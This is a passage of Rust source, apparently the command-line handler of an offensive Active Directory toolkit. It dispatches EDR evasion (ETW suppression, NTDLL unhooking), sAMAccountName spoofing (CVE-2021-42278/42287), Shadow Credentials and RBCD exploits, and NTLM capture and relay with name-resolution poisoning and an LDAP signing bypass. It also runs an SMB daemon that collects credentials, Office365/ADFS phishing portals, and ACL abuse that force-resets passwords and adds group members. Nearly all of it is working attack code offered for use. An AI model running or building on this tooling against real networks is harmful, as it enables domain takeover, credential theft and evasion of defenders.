                                );
                                println!(
                                    "  {} ETW suppressed: {}",
                                    "✓".green(),
                                    stealth.etw_suppressed
                                );
                                println!(
                                    "  {} NTDLL unhooked: {}",
                                    "✓".green(),
                                    stealth.ntdll_unhooked
                                );
                                banner::print_success("Evasion applied successfully");
                            } else {
                                banner::print_warn("Evasion applied with warnings");
                                for err in &stealth.errors {
                                    println!("    - {}", err);
                                }
                            }
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Evasion failed: {}", e));
                            return 1;
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("EDR assessment failed: {}", e));
                    return 1;
                }
            }
        }
    }
    0
}

// cmd_exploit — CVE Exploit handler
async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
    use overthrone_core::postex::cves;

    let domain = match cli.domain.as_deref() {
        Some(d) => d.to_string(),
        None => {
            banner::print_fail("--domain is required");
            return 1;
        }
    };
    let dc_ip = match cli.dc_host.as_deref() {
        Some(d) => d.to_string(),
        None => {
            banner::print_fail("--dc-ip is required");
            return 1;
        }
    };
    let username = match cli.username.as_deref() {
        Some(u) => u.to_string(),
        None => {
            banner::print_fail("--username is required");
            return 1;
        }
    };
    let has_hash = cli.nt_hash.is_some();
    let ldap_pass = cli
        .nt_hash
        .as_deref()
        .or(cli.password.as_deref())
        .unwrap_or("");

    let ldap_user = if has_hash {
        format!("{}\\{}", domain, username)
    } else {
        username.clone()
    };

    let mut ldap = match overthrone_core::proto::ldap::LdapSession::connect(
        &dc_ip, &domain, &ldap_user, ldap_pass, has_hash,
    )
    .await
    {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&format!("LDAP connect to {dc_ip} for {domain} failed: {e}"));
            return 1;
        }
    };

    match action {
        ExploitAction::SamNameSpoof { dc_sam, password } => {
            banner::print_module_banner("CVE-2021-42278/42287 — sAMAccountName Spoofing");
            println!("  {} Target DC: {}", "▸".bright_black(), dc_sam.cyan());
            println!(
                "  {} Password:   {}",
                "▸".bright_black(),
                password.bright_black()
            );

            match cves::exploit_samname_spoof(&mut ldap, &dc_ip, &domain, &dc_sam, &password).await
            {
                Ok(result) => {
                    banner::print_success(&format!("TGT obtained for {}", dc_sam));
                    println!("  {} Computer DN: {}", "✓".green(), result.computer_dn);
                    println!(
                        "  {} Session key: {} bytes",
                        "▸".bright_black(),
                        result.session_key.len()
                    );
                    banner::print_warn(
                        "Run `ovt exploit cleanup samname-spoof --computer-dn <DN>` to clean up",
                    );
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("sAMAccountName spoof of {dc_sam} failed: {e}"));
                    1
                }
            }
        }
        ExploitAction::ShadowCred { target_dn } => {
            banner::print_module_banner("Shadow Credentials — PKINIT Auth");
            println!("  {} Target DN: {}", "▸".bright_black(), target_dn.cyan());

            match cves::exploit_shadow_credentials(&mut ldap, &dc_ip, &domain, &target_dn).await {
                Ok(result) => {
                    banner::print_success(&format!("TGT obtained for {target_dn}"));
                    println!(
                        "  {} Cert: {} bytes",
                        "▸".bright_black(),
                        result.certificate.len()
                    );
                    println!(
                        "  {} Key:  {} bytes",
                        "▸".bright_black(),
                        result.private_key.len()
                    );
                    println!("  {} TGT:  {} bytes", "▸".bright_black(), result.tgt.len());
                    banner::print_warn(
                        "Run `ovt exploit cleanup shadow-cred --target-dn <DN>` to clean up",
                    );
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Shadow credentials on {target_dn} failed: {e}"));
                    1
                }
            }
        }
        ExploitAction::Rbcd {
            target_dn,
            attacker,
            password,
        } => {
            banner::print_module_banner("RBCD — Resource-Based Constrained Delegation");
            println!("  {} Target DN:  {}", "▸".bright_black(), target_dn.cyan());
            println!("  {} Attacker:    {}", "▸".bright_black(), attacker.cyan());

            match cves::exploit_rbcd(&mut ldap, &dc_ip, &domain, &target_dn, &attacker, &password)
                .await
            {
                Ok(result) => {
                    banner::print_success(&format!(
                        "RBCD set — {attacker} can now impersonate any user to {target_dn}"
                    ));
                    println!(
                        "  {} Attacker SID: {}",
                        "▸".bright_black(),
                        result.attacker_sid
                    );
                    banner::print_warn(
                        "Run `ovt exploit cleanup rbcd --target-dn <DN>` to clean up",
                    );
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("RBCD on {target_dn} for {attacker} failed: {e}"));
                    1
                }
            }
        }
        ExploitAction::Cleanup {
            artifact,
            target_dn,
            computer_dn,
        } => {
            banner::print_module_banner("Exploit Cleanup");
            match artifact {
                CleanupTarget::SamNameSpoof => {
                    if let Some(dn) = computer_dn {
                        match cves::cleanup_samname_spoof(&mut ldap, &dn).await {
                            Ok(_) => {
                                banner::print_success("Spoofed computer removed");
                                0
                            }
                            Err(e) => {
                                banner::print_fail(&format!(
                                    "Cleanup samname-spoof on {dn} failed: {e}"
                                ));
                                1
                            }
                        }
                    } else {
                        banner::print_fail("--computer-dn is required for samname-spoof cleanup");
                        1
                    }
                }
                CleanupTarget::ShadowCred => {
                    if let Some(dn) = target_dn {
                        match cves::cleanup_shadow_credentials(&mut ldap, &dn).await {
                            Ok(_) => {
                                banner::print_success("KeyCredentialLink removed");
                                0
                            }
                            Err(e) => {
                                banner::print_fail(&format!(
                                    "Cleanup shadow-cred on {dn} failed: {e}"
                                ));
                                1
                            }
                        }
                    } else {
                        banner::print_fail("--target-dn is required for shadow-cred cleanup");
                        1
                    }
                }
                CleanupTarget::Rbcd => {
                    if let Some(dn) = target_dn {
                        match cves::cleanup_rbcd(&mut ldap, &dn).await {
                            Ok(_) => {
                                banner::print_success("RBCD delegation removed");
                                0
                            }
                            Err(e) => {
                                banner::print_fail(&format!("Cleanup rbcd on {dn} failed: {e}"));
                                1
                            }
                        }
                    } else {
                        banner::print_fail("--target-dn is required for rbcd cleanup");
                        1
                    }
                }
            }
        }
    }
}

/// Load mTLS identity from optional cert/key file paths and build a TlsConfig.
/// Returns `None` when both paths are `None`, or a loaded `TlsConfig` with
/// Build optional coercion credentials from CLI flags.
/// Returns `Some(CoerceCreds)` when both user and password are provided.
fn build_coerce_creds(
    domain: Option<String>,
    user: Option<String>,
    password: Option<String>,
) -> Option<overthrone_core::proto::coerce::CoerceCreds> {
    match (user, password) {
        (Some(u), Some(p)) => Some(overthrone_core::proto::coerce::CoerceCreds {
            domain: domain.unwrap_or_else(|| ".".to_string()),
            username: u,
            password: p,
        }),
        _ => None,
    }
}

/// Load TLS configuration from optional PEM file paths with
/// the specified verification mode and optional client identity.
/// Errors if only one is provided or file loading fails.
fn load_tls_config(
    cert_path: Option<&str>,
    key_path: Option<&str>,
    tls_verify: bool,
) -> Result<Option<overthrone_relay::tls::TlsConfig>, String> {
    let verification_mode = if tls_verify {
        overthrone_relay::tls::TlsVerificationMode::VerifyServerCert
    } else {
        overthrone_relay::tls::TlsVerificationMode::AcceptAll
    };
    match (cert_path, key_path) {
        (Some(cert), Some(key)) => {
            let identity = overthrone_relay::tls::TlsIdentity::load(cert, key).map_err(|e| {
                format!(
                    "Failed to load TLS identity (cert={:?}, key={:?}): {e}",
                    cert, key
                )
            })?;
            Ok(Some(overthrone_relay::tls::TlsConfig {
                verification_mode,
                identity: Some(identity),
            }))
        }
        (Some(_), None) => Err("--tls-client-cert requires --tls-client-key".into()),
        (None, Some(_)) => Err("--tls-client-key requires --tls-client-cert".into()),
        (None, None) => {
            if tls_verify {
                Ok(Some(overthrone_relay::tls::TlsConfig {
                    verification_mode: overthrone_relay::tls::TlsVerificationMode::VerifyServerCert,
                    identity: None,
                }))
            } else {
                Ok(None)
            }
        }
    }
}

/// Parse relay target strings in `protocol://host:port` or `host:port` format.
/// Supports protocols: smb, http, https, ldap, ldaps, mssql, msmq, exchange.
fn parse_relay_targets(targets: &[String]) -> Vec<overthrone_relay::RelayTarget> {
    use overthrone_relay::{Protocol, RelayTarget};
    use std::net::SocketAddr;

    targets
        .iter()
        .filter_map(|t| {
            let (protocol_prefix, rest) = if let Some(idx) = t.find("://") {
                let proto = &t[..idx].to_lowercase();
                let rest = &t[idx + 3..];
                let protocol = match proto.as_str() {
                    "smb" => Protocol::Smb,
                    "http" => Protocol::Http,
                    "https" => Protocol::Https,
                    "ldap" => Protocol::Ldap,
                    "ldaps" => Protocol::Ldaps,
                    "mssql" => Protocol::Mssql,
                    "msmq" => Protocol::Msmq,
                    "exchange" => Protocol::Exchange,
                    _ => return None,
                };
                (Some(protocol), rest)
            } else {
                (None, t.as_str())
            };
            let parts: Vec<&str> = rest.split(':').collect();
            let ip = parts[0].to_string();
            let port = parts
                .get(1)
                .and_then(|p| p.parse().ok())
                .unwrap_or(match protocol_prefix {
                    Some(Protocol::Smb) => 445,
                    Some(Protocol::Https) => 443,
                    Some(Protocol::Ldaps) => 636,
                    Some(Protocol::Mssql) => 1433,
                    Some(Protocol::Msmq) => 1801,
                    _ => 80,
                });
            let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
            let protocol = protocol_prefix.unwrap_or(match port {
                443 => Protocol::Https,
                445 => Protocol::Smb,
                389 | 636 => Protocol::Ldap,
                _ => Protocol::Smb,
            });
            Some(RelayTarget {
                address: addr,
                protocol,
                username: None,
            })
        })
        .collect()
}

// cmd_ntlm
#[cfg(feature = "relay")]
async fn cmd_ntlm(action: NtlmAction) -> i32 {
    use overthrone_relay::{Protocol, RelayController, RelayControllerConfig, RelayTarget};
    use std::net::SocketAddr;

    banner::print_module_banner("NTLM RELAY");

    match action {
        NtlmAction::Capture {
            interface,
            port: _,
            no_poison,
            mitm6,
            mdns,
            llmnr,
            nbtns,
            analyze,
            poison_ip,
            wpad,
            socks5_proxy,
        } => {
            println!(
                "{} Starting NTLM capture on {}{}{}{}{}",
                "🎯".bright_black(),
                interface.cyan(),
                if no_poison {
                    " (relay-only / no poison)"
                } else {
                    ""
                },
                if analyze { " (analyze-only)" } else { "" },
                if wpad.is_some() {
                    " (WPAD enabled)"
                } else {
                    ""
                },
                if mdns { " (mDNS enabled)" } else { "" },
            );

            let wpad_config = wpad.map(|url| overthrone_relay::WpadConfig::new(url));

            let config = RelayControllerConfig {
                interface: interface.clone(),
                llmnr,
                nbtns,
                mdns,
                mitm6,
                responder: true,
                relay_targets: vec![],
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
                no_poison,
                ldap_signing_bypass: true,
                tls_config: None,
                auto_coerce_targets: Vec::new(),
                auto_coerce_listener: None,
                socks5_proxy,
                http_relay_config: None,
                auto_coerce_parallel: false,
                auto_coerce_mode: "all".to_string(),
                auto_coerce_max_retries: 1,
                auto_coerce_credentials: None,
                tls_relay_config: None,
                analyze_only: analyze,
                poison_ip,
                wpad_config,
            };
            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        banner::print_success("NTLM capture started");
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("Capture failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::Relay {
            targets,
            port: _,
            command,
            no_poison,
            mitm6,
            ldap_signing_bypass,
            auto_coerce_targets,
            auto_coerce_listener,
            auto_coerce_domain,
            auto_coerce_user,
            auto_coerce_password,
            tls_client_cert,
            tls_client_key,
            tls_verify,
            socks5_proxy,
        } => {
            println!(
                "{} Starting NTLM relay to {} targets {}",
                "dYZ_".bright_black(),
                targets.join(", ").cyan(),
                if no_poison { "(relay-only)" } else { "" }
            );

            let tls_config = match load_tls_config(
                tls_client_cert.as_deref(),
                tls_client_key.as_deref(),
                tls_verify,
            ) {
                Ok(id) => id,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };

            let relay_targets: Vec<RelayTarget> = targets
                .iter()
                .filter_map(|t| {
                    let parts: Vec<&str> = t.split(':').collect();
                    let ip = parts[0].to_string();
                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(445);
                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
                    let protocol = if port == 80 {
                        Protocol::Http
                    } else if port == 443 {
                        Protocol::Https
                    } else {
                        Protocol::Smb
                    };
                    Some(RelayTarget {
                        address: addr,
                        protocol,
                        username: None,
                    })
                })
                .collect();

            let config = RelayControllerConfig {
                interface: "0.0.0.0".to_string(),
                llmnr: true,
                nbtns: true,
                mdns: false,
                mitm6,
                responder: true,
                relay_targets,
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
                no_poison,
                ldap_signing_bypass,
                tls_config,
                auto_coerce_targets,
                auto_coerce_listener,
                socks5_proxy,
                http_relay_config: None,
                auto_coerce_parallel: false,
                auto_coerce_mode: "all".to_string(),
                auto_coerce_max_retries: 1,
                auto_coerce_credentials: build_coerce_creds(
                    auto_coerce_domain,
                    auto_coerce_user,
                    auto_coerce_password,
                ),
                tls_relay_config: None,
                analyze_only: false,
                poison_ip: None,
                wpad_config: None,
            };
            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        banner::print_success("HTTP relay started");
                        if let Some(cmd) = command {
                            println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
                        }
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("HTTP relay failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::SmbRelay {
            targets,
            port: _,
            command,
            mitm6,
            ldap_signing_bypass,
            auto_coerce_targets,
            auto_coerce_listener,
            auto_coerce_domain,
            auto_coerce_user,
            auto_coerce_password,
            tls_client_cert,
            tls_client_key,
            tls_verify,
            socks5_proxy,
        } => {
            println!(
                "{} Starting SMB relay to {} targets",
                "dYZ_".bright_black(),
                targets.join(", ").cyan()
            );

            let tls_config = match load_tls_config(
                tls_client_cert.as_deref(),
                tls_client_key.as_deref(),
                tls_verify,
            ) {
                Ok(id) => id,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };

            let relay_targets: Vec<RelayTarget> = targets
                .iter()
                .filter_map(|t| {
                    let parts: Vec<&str> = t.split(':').collect();
                    let ip = parts[0].to_string();
                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(445);
                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
                    Some(RelayTarget {
                        address: addr,
                        protocol: Protocol::Smb,
                        username: None,
                    })
                })
                .collect();
            let config = RelayControllerConfig {
                interface: "0.0.0.0".to_string(),
                llmnr: true,
                nbtns: true,
                mdns: false,
                mitm6,
                responder: true,
                relay_targets,
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
                no_poison: false,
                ldap_signing_bypass,
                tls_config,
                auto_coerce_targets,
                auto_coerce_listener,
                socks5_proxy,
                http_relay_config: None,
                auto_coerce_parallel: false,
                auto_coerce_mode: "all".to_string(),
                auto_coerce_max_retries: 1,
                auto_coerce_credentials: build_coerce_creds(
                    auto_coerce_domain,
                    auto_coerce_user,
                    auto_coerce_password,
                ),
                tls_relay_config: None,
                analyze_only: false,
                poison_ip: None,
                wpad_config: None,
            };
            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        if let Some(cmd) = command {
                            println!("{} Will execute: {}", "s".bright_black(), cmd.yellow());
                        }
                        banner::print_success("SMB relay started");
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("SMB relay failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::HttpRelay {
            targets,
            port: _,
            command,
            mitm6,
            ldap_signing_bypass,
            auto_coerce_targets,
            auto_coerce_listener,
            auto_coerce_domain,
            auto_coerce_user,
            auto_coerce_password,
            tls_client_cert,
            tls_client_key,
            tls_verify,
            socks5_proxy,
        } => {
            println!(
                "{} Starting HTTP relay to {} targets",
                "dYZ_".bright_black(),
                targets.join(", ").cyan()
            );

            let tls_config = match load_tls_config(
                tls_client_cert.as_deref(),
                tls_client_key.as_deref(),
                tls_verify,
            ) {
                Ok(id) => id,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };

            let relay_targets: Vec<RelayTarget> = targets
                .iter()
                .filter_map(|t| {
                    let parts: Vec<&str> = t.split(':').collect();
                    let ip = parts[0].to_string();
                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(80);
                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
                    Some(RelayTarget {
                        address: addr,
                        protocol: if port == 443 {
                            Protocol::Https
                        } else {
                            Protocol::Http
                        },
                        username: None,
                    })
                })
                .collect();
            let config = RelayControllerConfig {
                interface: "0.0.0.0".to_string(),
                llmnr: true,
                nbtns: true,
                mdns: false,
                mitm6,
                responder: true,
                relay_targets,
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
                no_poison: false,
                ldap_signing_bypass,
                tls_config,
                auto_coerce_targets,
                auto_coerce_listener,
                socks5_proxy,
                http_relay_config: None,
                auto_coerce_parallel: false,
                auto_coerce_mode: "all".to_string(),
                auto_coerce_max_retries: 1,
                auto_coerce_credentials: build_coerce_creds(
                    auto_coerce_domain,
                    auto_coerce_user,
                    auto_coerce_password,
                ),
                tls_relay_config: None,
                analyze_only: false,
                poison_ip: None,
                wpad_config: None,
            };
            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        if let Some(cmd) = command {
                            println!("{} Will execute: {}", "s".bright_black(), cmd.yellow());
                        }
                        banner::print_success("HTTP relay started");
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("HTTP relay failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::HttpAsymmetric {
            targets,
            port,
            interface,
            socks5_proxy,
        } => {
            println!(
                "{} Starting HTTP asymmetric relay on {}:{} with {} targets",
                "dYZ_".bright_black(),
                interface.cyan(),
                port,
                targets.len()
            );

            use overthrone_relay::http_asymmetric::{HttpAsymmetricConfig, HttpAsymmetricRelay};
            use overthrone_relay::{Protocol, RelayTarget};
            use std::net::SocketAddr;

            let relay_targets: Vec<RelayTarget> = targets
                .iter()
                .filter_map(|t| {
                    // Support protocol://host:port and host:port formats
                    let (protocol_prefix, rest) = if let Some(idx) = t.find("://") {
                        let proto = &t[..idx].to_lowercase();
                        let rest = &t[idx + 3..];
                        let protocol = match proto.as_str() {
                            "smb" => Protocol::Smb,
                            "http" => Protocol::Http,
                            "https" => Protocol::Https,
                            "ldap" => Protocol::Ldap,
                            "ldaps" => Protocol::Ldaps,
                            "mssql" => Protocol::Mssql,
                            "msmq" => Protocol::Msmq,
                            "exchange" => Protocol::Exchange,
                            _ => return None,
                        };
                        (Some(protocol), rest)
                    } else {
                        (None, t.as_str())
                    };
                    let parts: Vec<&str> = rest.split(':').collect();
                    let ip = parts[0].to_string();
                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(
                        match protocol_prefix {
                            Some(Protocol::Smb) => 445,
                            Some(Protocol::Https) => 443,
                            Some(Protocol::Ldaps) => 636,
                            Some(Protocol::Mssql) => 1433,
                            Some(Protocol::Msmq) => 1801,
                            _ => 80,
                        },
                    );
                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
                    let protocol = protocol_prefix.unwrap_or(match port {
                        443 => Protocol::Https,
                        445 => Protocol::Smb,
                        389 | 636 => Protocol::Ldap,
                        _ => Protocol::Smb,
                    });
                    Some(RelayTarget {
                        address: addr,
                        protocol,
                        username: None,
                    })
                })
                .collect();

            if relay_targets.is_empty() {
                banner::print_fail("No valid relay targets specified");
                return 1;
            }

            let config = HttpAsymmetricConfig {
                listen_ip: interface.clone(),
                listen_port: port,
                targets: relay_targets,
                socks5_proxy,
                ldap_signing_bypass: true,
                max_retries: 3,
                timeout_secs: 30,
            };
            let mut relay = HttpAsymmetricRelay::new(config);
            match relay.start().await {
                Ok(_) => {
                    banner::print_success("HTTP asymmetric relay started");
                    if tokio::signal::ctrl_c().await.is_err() {
                        banner::print_fail(
                            "Failed to register Ctrl+C handler — continuing shutdown",
                        );
                    }
                    let _ = relay.stop().await;
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("HTTP asymmetric relay failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::LdapRelay {
            target,
            port,
            ldaps,
            no_signing_bypass,
            auto_coerce_targets,
            auto_coerce_listener,
            auto_coerce_domain,
            auto_coerce_user,
            auto_coerce_password,
            tls_client_cert,
            tls_client_key,
            tls_verify,
            socks5_proxy,
        } => {
            let tls_config = match load_tls_config(
                tls_client_cert.as_deref(),
                tls_client_key.as_deref(),
                tls_verify,
            ) {
                Ok(id) => id,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };

            let proto = if ldaps {
                Protocol::Ldaps
            } else {
                Protocol::Ldap
            };
            let addr = match format!("{}:{}", target, port).parse::<SocketAddr>() {
                Ok(a) => a,
                Err(_) => {
                    // If target has no port in the string, use the parsed port
                    let host = target.split(':').next().unwrap_or(&target);
                    let addr_str = format!("{}:{}", host, port);
                    match addr_str.parse::<SocketAddr>() {
                        Ok(a) => a,
                        Err(_) => {
                            banner::print_fail(&format!("Invalid target address: {host}:{port}"));
                            return 1;
                        }
                    }
                }
            };
            println!(
                "{} Starting LDAP{} relay to {} with GSS-SPNEGO signing bypass {}",
                "🎯".bright_black(),
                if ldaps { "S" } else { "" },
                addr.to_string().cyan(),
                if no_signing_bypass {
                    "(disabled)"
                } else {
                    "(enabled)"
                }
            );

            let relay_targets = vec![RelayTarget {
                address: addr,
                protocol: proto,
                username: None,
            }];
            let config = RelayControllerConfig {
                interface: "0.0.0.0".to_string(),
                llmnr: false,
                nbtns: false,
                mdns: false,
                mitm6: false,
                responder: true,
                relay_targets,
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
                no_poison: false,
                ldap_signing_bypass: !no_signing_bypass,
                tls_config,
                auto_coerce_targets,
                auto_coerce_listener,
                socks5_proxy,
                http_relay_config: None,
                auto_coerce_parallel: false,
                auto_coerce_mode: "all".to_string(),
                auto_coerce_max_retries: 1,
                auto_coerce_credentials: build_coerce_creds(
                    auto_coerce_domain,
                    auto_coerce_user,
                    auto_coerce_password,
                ),
                tls_relay_config: None,
                analyze_only: false,
                poison_ip: None,
                wpad_config: None,
            };
            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        banner::print_success("LDAP relay started — listening on port 389");
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("LDAP relay failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::SmbDaemon { interface, port } => {
            banner::print_module_banner("SMB DAEMON");
            println!(
                "{} Starting SMB2 daemon on {}:{}",
                "🎯".bright_black(),
                interface.cyan(),
                port
            );

            use overthrone_relay::{SmbDaemon, SmbDaemonConfig, SmbDaemonMode};

            let config = SmbDaemonConfig {
                listen_ip: interface.clone(),
                listen_port: port,
                challenge: None,
                mode: SmbDaemonMode::Capture,
                domain_name: "LAN".to_string(),
                socks5_proxy: None,
            };
            let mut daemon = SmbDaemon::new(config);
            match daemon.start().await {
                Ok(_) => {
                    banner::print_success("SMB daemon started — capturing credentials on port 445");
                    if tokio::signal::ctrl_c().await.is_err() {
                        banner::print_fail(
                            "Failed to register Ctrl+C handler — continuing shutdown",
                        );
                    }
                    daemon.stop();
                    let captured = daemon.get_captured_credentials();
                    println!(
                        "{} Captured {} credential(s)",
                        "📊".bright_black(),
                        captured.len()
                    );
                    for cred in &captured {
                        println!(
                            "  {}\\{} - {}",
                            cred.domain.cyan(),
                            cred.username.green(),
                            cred.client_ip
                        );
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("SMB daemon failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::TlsRelay {
            targets,
            port,
            interface,
            tls_cert,
            tls_key,
            mtls_client_ca,
            cbt_mode,
            socks5_proxy,
        } => {
            println!(
                "{} Starting TLS-wrapped relay on {}:{} with {} targets",
                "🔒".bright_black(),
                interface.cyan(),
                port,
                targets.len()
            );

            use overthrone_relay::tls_relay::{CbtMode, TlsRelay, TlsRelayConfig};

            let cbt_mode_parsed = match cbt_mode.to_lowercase().as_str() {
                "passthrough" => CbtMode::Passthrough,
                "validate" => CbtMode::Validate,
                _ => CbtMode::Strip,
            };

            let relay_targets = parse_relay_targets(&targets);
            if relay_targets.is_empty() {
                banner::print_fail("No valid relay targets specified");
                return 1;
            }

            let config = TlsRelayConfig {
                listen_ip: interface.clone(),
                listen_port: port,
                tls_cert_path: tls_cert,
                tls_key_path: tls_key,
                mtls_client_ca_path: mtls_client_ca,
                targets: relay_targets,
                socks5_proxy,
                ldap_signing_bypass: true,
                max_retries: 3,
                timeout_secs: 30,
                cbt_mode: cbt_mode_parsed,
            };
            let mut relay = TlsRelay::new(config);
            match relay.start().await {
                Ok(_) => {
                    banner::print_success("TLS relay started");
                    if tokio::signal::ctrl_c().await.is_err() {
                        banner::print_fail(
                            "Failed to register Ctrl+C handler — continuing shutdown",
                        );
                    }
                    relay.stop().await;
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("TLS relay failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::Exchange {
            target,
            port,
            no_tls,
            ews_path,
            mapi_path,
            prefer_mapi,
            version,
            tls_client_cert,
            tls_client_key,
            tls_verify,
            socks5_proxy,
        } => {
            println!(
                "{} Starting Exchange NTLM relay to {}{}",
                "🎯".bright_black(),
                target.cyan(),
                if no_tls { " (plain HTTP)" } else { " (TLS)" }
            );

            use overthrone_relay::exchange::{ExchangeRelay, ExchangeRelayConfig};

            let tls_config = match load_tls_config(
                tls_client_cert.as_deref(),
                tls_client_key.as_deref(),
                tls_verify,
            ) {
                Ok(id) => id,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };

            let config = ExchangeRelayConfig {
                listen_ip: "0.0.0.0".into(),
                target_host: target.clone(),
                target_port: port,
                use_tls: !no_tls,
                ews_path: ews_path.clone(),
                mapi_path: mapi_path.clone(),
                autodiscover_path: "/autodiscover/autodiscover.xml".into(),
                oab_path: "/oab/".into(),
                prefer_mapi,
                exchange_version: match version.to_lowercase().as_str() {
                    "2013" | "exchange2013" | "exchange 2013" => {
                        overthrone_relay::exchange::ExchangeVersion::Exchange2013
                    }
                    "2016" | "exchange2016" | "exchange 2016" => {
                        overthrone_relay::exchange::ExchangeVersion::Exchange2016
                    }
                    "2019" | "exchange2019" | "exchange 2019" => {
                        overthrone_relay::exchange::ExchangeVersion::Exchange2019
                    }
                    "online" | "exchangeonline" | "exchange online" | "o365" => {
                        overthrone_relay::exchange::ExchangeVersion::ExchangeOnline
                    }
                    _ => overthrone_relay::exchange::ExchangeVersion::AutoDetect,
                },
                socks5_proxy,
                endpoint_type: overthrone_relay::exchange::ExchangeEndpoint::Auto,
                tls_config,
            };
            let mut relay = ExchangeRelay::new(config);
            match relay.start().await {
                Ok(_) => {
                    banner::print_success("Exchange relay started");
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Exchange relay failed: {}", e));
                    1
                }
            }
        }

        NtlmAction::CaptivePortal {
            port,
            interface,
            template,
            company,
            redirect_url,
        } => {
            use overthrone_relay::captive_portal::{
                CaptivePortal, CaptivePortalConfig, CaptivePortalTemplate,
            };

            let template_enum: CaptivePortalTemplate = match template.to_lowercase().as_str() {
                "office365" => CaptivePortalTemplate::Office365,
                "adfs" => CaptivePortalTemplate::Adfs,
                _ => CaptivePortalTemplate::Generic,
            };

            let ip: std::net::IpAddr = interface
                .parse()
                .unwrap_or(std::net::IpAddr::V4(std::net::Ipv4Addr::new(0, 0, 0, 0)));

            let config = CaptivePortalConfig {
                listen_ip: ip,
                listen_port: port,
                template: template_enum,
                company_name: company.clone(),
                target_url: redirect_url.clone(),
                ..CaptivePortalConfig::default()
            };

            let mut portal = CaptivePortal::new(config);
            match portal.start() {
                Ok(_) => {
                    banner::print_success(&format!(
                        "Captive portal started on {}:{} (template: {})",
                        interface, port, template
                    ));
                    println!("  {} Press Enter to stop...", ">".bright_black());
                    let mut input = String::new();
                    let _ = std::io::stdin().read_line(&mut input);
                    let _ = portal.stop();
                    println!("  {} Captive portal stopped", "[+]".green());
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Captive portal failed: {}", e));
                    1
                }
            }
        }
    }
}

// ──────────────────────────────────────────────────────────
// ACL Abuse Handler
// ──────────────────────────────────────────────────────────
// ACL Abuse Handler
// ──────────────────────────────────────────────────────────

async fn cmd_acl(cli: &Cli, action: AclAction) -> i32 {
    use overthrone_core::proto::ldap::LdapSession;

    banner::print_module_banner("ACL ABUSE");

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    let mut ldap = match LdapSession::connect(
        &dc,
        cli.domain.as_deref().unwrap_or(""),
        &creds.username,
        creds.password().unwrap_or(""),
        false,
    )
    .await
    {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&format!("LDAP connect failed: {}", e));
            return 1;
        }
    };

    let result = match action {
        AclAction::ForcePassword { target, password } => {
            println!(
                "{} Force-changing password for {} ...",
                "[*]".bright_black(),
                target.cyan()
            );
            ldap.force_change_password(&target, &password).await
        }
        AclAction::AddMember { group, member } => {
            println!(
                "{} Adding {} to group {} ...",
                "[*]".bright_black(),
                member.cyan(),
                group.yellow()
            );
            ldap.add_member_to_group(&group, &member).await
        }
        AclAction::RemoveMember { group, member } => {
            println!(
                "{} Removing {} from group {} ...",
